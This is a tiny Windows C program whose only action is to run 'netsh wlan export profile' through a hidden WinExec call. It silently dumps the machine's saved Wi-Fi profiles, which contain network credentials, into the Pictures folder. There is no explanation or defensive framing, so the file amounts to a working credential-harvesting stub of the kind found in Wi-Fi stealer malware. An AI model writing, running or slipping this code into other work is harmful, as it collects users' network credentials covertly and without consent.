#include <windows.h>

void main(){
    WinExec("cmd.exe /c netsh wlan export profile folder=Pictures", 0);    
}
